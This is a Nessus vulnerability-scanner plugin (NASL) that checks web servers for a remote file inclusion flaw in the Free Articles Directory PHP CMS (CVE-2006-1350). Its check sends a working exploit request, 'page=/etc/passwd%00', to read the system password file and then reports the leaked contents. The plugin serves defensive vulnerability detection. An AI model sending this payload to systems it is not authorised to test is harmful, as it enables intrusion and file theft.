#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by a
remote file include vulnerability. 

Description :

The remote host is running Free Articles Directory, a CMS written in
PHP. 

The installed version of Free Articles Directory fails to sanitize
user input to the 'page' parameter in index.php.  An unauthenticated
attacker may be able to read arbitrary local files or include a file
from a remote host that contains commands which will be executed by
the vulnerable script, subject to the privileges of the web server
process. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2006-03/0396.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21146);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1350");
  script_bugtraq_id(17183);
  script_xref(name:"OSVDB", value:"24024");

  name["english"] = "Free Articles Directory Remote File Inclusion Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file includes in Free Articles Directory";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# The '/99articles' directory does not seem too popular, but it is the default
# installation directory
if (thorough_tests) dirs = make_list("/99articles", cgi_dirs());
else dirs = make_list(cgi_dirs());


# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "page=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);
  
  # There's a problem if...
  if (
    # there's an entry for root or...
    (
      'Website Powered by <strong><a href="http://www.ArticlesOne.com">ArticlesOne.com' >< res &&
      egrep(pattern:"root:.*:0:[01]:", string:res) 
    ) ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.+/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      content = strstr(res, "<input type=image name=subscribe");
      if (content) content = strstr(content, 'style="padding-left:10">');
      if (content) content = content - 'style="padding-left:10">';
      if (content) content = content - strstr(content, "</td>");
    }

    if (content)
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc["english"];

    security_warning(port:port, data:report);
    exit(0);
  }
}
